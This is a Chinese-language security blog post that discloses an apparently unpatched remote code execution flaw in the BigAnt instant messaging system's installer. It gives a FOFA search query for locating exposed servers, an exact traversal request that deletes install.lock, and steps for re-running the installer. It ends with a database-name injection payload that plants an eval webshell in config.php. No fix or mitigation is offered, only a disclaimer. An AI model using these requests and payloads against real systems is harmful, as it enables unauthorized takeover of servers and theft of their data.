#  【0day】大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞  
 0day收割机   2026-02-26 09:03  
  
# 漏洞简介  
  
大蚂蚁 (BigAnt) 即时通讯系统安装程序存在二次注入漏洞。攻击者可通过删除或重命名 install.lock 文件，重新进入安装流程，并在数据库配置部分（如数据库用户、IP、端口、数据库名等字段）注入恶意 PHP 代码，实现远程代码执行。  
# 影响版本  
  
BigAnt 5.5.x 及以上版本用户  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWD4H5u1j1oLeCAEAHs1gjcTLmCEUAOKXMDCbS4YsyZHPiavhWj6PcIpKTt4Kfp9JrSND4IIic0RTib7BibheZ5qC6hh05uMuKttsibM/640?wx_fmt=png&from=appmsg "")  
  
经过测试，最新版本 6.0.1.20250407.1 也受影响  
# fofa语法  
> (body="/Public/static/admin/admin_common.js" && body="/Public/lang/zh-cn.js.js") || title="即时通讯 系统登录" && body="/Public/static/ukey/Syunew3.js"  
  
# 漏洞复现  
## 设置路径  
```
POST /?m=Addin&c=Pedometer&a=uploadImgCallback HTTP/1.1Host: Cookie: PHPSESSID=xxxxxContent-Type: application/x-www-form-urlencodeduserId=1&src=/data/../data/install.lock
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWDy1ZwUwVUeZwhxzvia1osH9FL4C4uhGJqxq9y28eO2XdLXXrld7SJlRFb0u38IykL3eBstE5Yhp9G6wU3RV68twmkfbX6fqELU/640?wx_fmt=png&from=appmsg "")  
  
同一个包需要发送两次，第一次更新表，第二次触发删除操作  
## RCE  
  
访问 /install/install 安装配置，选择其他数据库,如果选择mysql需要数据库服务器存在且可以连通  
```
//检测连接是否有效$db  = Db::getInstance($dbconfig);$sql = \Common\Lib\DBHelper::getCheckConnSql($dbconfig['DB_TYPE']);$result = $db->query($sql);if(false === $result){       $url = U('step2',array('dbtype'=>$dbType,'err'=>'db'));       $this->error(L('_ERROR_DB_CONNECT_'),$url);   }
```  
  
否则可以选择Oracle,会跳过存活检测  
```
switch(strtolower($dbType)){    case "oracle":        break; // 直接跳过，不执行 createDataBase    default:        $res = \Common\Lib\DBHelper::createDataBase(...);}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWCuvxhAYmmxWQXIpR5B2CdjyXN7CQ74mOeMFDBprRxPjdBAPbENCDWfTI2nfu3OS4ANv7ezpCWEhavFbxQftmUhhelmDcbMY94/640?wx_fmt=png&from=appmsg "")  
  
下一步  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWAnN2tia3xSMBTY9bfoXlicsaYD3YhNCqdTwtY7c7rwVZb5txmfqHKtCoFWKUrPFaVqEicKXWSFCCy4zXWFiaiapcXTt5rhiaiaxQuEIs/640?wx_fmt=png&from=appmsg "")  
  
比如，将数据库名设置成antdbms', 'test' => @eval($_REQUEST['cmd']),'  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWAv9UrasZyhjqmOVA5h3TZD75I7V3IhhvqUCj1NBYrxlmhzv1GsQOqNbc6p1yVFpvd9LVdHHQIG9hVn3F1ZdAmvoGhvD5JNib4s/640?wx_fmt=png&from=appmsg "")  
  
下一步  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWCwOMLDTXhTAmrIoDYH32Sibb7KeOzpjBnhibEvWicLN5RicbFaD5y6nPE8btsFcwW85cYMMIJ0BwDl3a1I0xq2yb1lcBvw40NezRo/640?wx_fmt=png&from=appmsg "")  
  
查看 Application/Common/Conf/config.php 配置文件如下图所示  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWA8ib76pR1Q3bYZ3GjfaCUmeJuJNWvVNPJwqTtLomL8gDv1hC7libFDCxicuqFtaesJh4Vy4icaw8pMnhtl5Jibnyw1qLW5GOosMj9c/640?wx_fmt=png&from=appmsg "")  
  
成功写入并执行php代码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWDU1Xp3XpNoH5Is8vSblMic3GCwYxJRUgdjp2KdiaWGqZn8WX9rN9EktTV8FVBHuNO06N0S2wsrJjDBcSvJeaGxphgXPuRSGQYIM/640?wx_fmt=png&from=appmsg "")  
  
仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。  
  
